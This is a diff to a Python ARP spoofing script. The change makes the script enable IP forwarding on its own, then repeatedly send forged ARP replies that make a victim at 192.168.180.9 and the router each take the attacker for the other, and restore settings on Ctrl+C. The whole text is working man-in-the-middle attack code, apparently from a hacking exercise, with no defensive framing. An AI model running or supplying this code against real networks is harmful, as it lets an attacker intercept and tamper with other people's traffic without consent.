@@ -26,14 +26,23 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet, verbose=False)
 
 
-if int(subprocess.run(["cat", "/proc/sys/net/ipv4/ip_forward"], capture_output=True).stdout.decode()) == 1:
-    sent_packets_count = 0
+ip_forward_flag = False
+if int(subprocess.run(["cat", "/proc/sys/net/ipv4/ip_forward"], capture_output=True).stdout.decode()) == 0:
+    ipv4 = subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
+    print(ipv4.stdout.decode().replace("net.ipv4.", "ipv4 "))
+else:
+    ip_forward_flag = True
+sent_packets_count = 0
+try:
     while True:
         spoof("192.168.180.9", "192.168.180.100")  # telling the victim we're the router
         spoof("192.168.180.100", "192.168.180.9")  # telling the router we're the victim
         sent_packets_count = sent_packets_count + 2
         print("[+] Packets sent: " + str(sent_packets_count), end='\r')
         time.sleep(2)
-else:
-    print("ip_forward is 0, modify it to 1. sysctl -w net.ipv4.ip_forward=1")
+except KeyboardInterrupt:
+    print("\r[+] Detected CTRL + C -> QUITING.", end='\n\n')
+    if not ip_forward_flag:
+        ipv4 = subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
+        print(ipv4.stdout.decode().replace("net.ipv4.", "Returning ipv4 "))
 
